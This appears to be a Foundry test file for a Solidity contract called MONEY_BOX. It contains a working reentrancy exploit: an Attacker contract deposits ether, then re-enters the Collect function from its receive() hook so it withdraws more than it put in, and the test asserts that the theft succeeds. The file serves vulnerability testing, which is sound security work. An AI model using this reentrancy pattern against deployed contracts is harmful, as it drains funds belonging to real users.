
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MONEY_BOX();
        _log = new Log();
        _contractUnderTest.SetLogFile(address(_log));
        _contractUnderTest.SetMinSum(0.01 ether);
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 0.01 ether && attackVal < 10 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // attacker deposits into MONEY_BOX via Put
        _attacker.setupAttack{value: attackVal}(attackVal);

        // ensure unlockTime has passed
        vm.warp(block.timestamp + 1 days);

        uint256 victimStartBalance = address(_contractUnderTest).balance;

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(address(_attacker).balance, attackVal, "Attacker did not gain extra funds");
        assertLt(address(_contractUnderTest).balance, victimStartBalance, "Victim balance did not decrease");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        // deposit into MONEY_BOX so that Collect conditions are satisfied
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // trigger first Collect
        _victim.Collect(val);

        // success if we managed to reenter at least once and drained more than initial
        if (attackCallCount > 1 && address(this).balance > initialSnapshot + 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;

        // re-enter only once to keep it simple
        if (attackCallCount < 2) {
            // try to drain as much as possible from victim
            uint256 victimBal = address(_victim).balance;
            uint256 amount = victimBal > storedAttackVal ? storedAttackVal : victimBal;
            if (amount > 0) {
                _victim.Collect(amount);
            }
        }
    }
}
